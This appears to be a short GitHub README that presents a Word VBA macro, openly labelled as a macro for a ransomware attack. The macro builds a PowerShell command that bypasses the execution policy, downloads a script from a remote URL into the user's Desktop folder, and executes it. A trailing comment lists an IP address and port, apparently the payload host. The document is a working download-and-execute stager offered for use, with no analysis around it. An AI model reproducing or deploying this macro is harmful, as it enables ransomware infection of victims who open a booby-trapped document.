# VBA-Macro-in-Word
Macro for RansomWare Attack

Sub test()
'
' test Macro
'
'
Dim downUrl As String
Dim code1 As String


downUrl = "http://naver.com" 'Filler를 사용해서 다이렉트url을 구현했습니다. Fiddler 이용해서 구현해주세요!
'![image](https://user-images.githubusercontent.com/77016353/119981727-eafa5100-bff8-11eb-8ec7-bee208741a14.png)
Dim downDir As String
downDir = "C:\Users\wjddj\OneDrive\Desktop\test\Y.ps1"

code1 = "cmd /k powershell -WindowStyle normal -ExecutionPolicy BypasS -noprofile (New-Object System.Net.WebClient).DownloadFile('" + downUrl + "', '" + downDir + "'); powershell -WindowStyle normal -ExecutionPolicy BypasS -noprofile -file '" + downDir + "'"

Shell code1, 1

MsgBox (code1)

End Sub

'http://naver.com
'http://101.101.211.160:8080/common/test.do
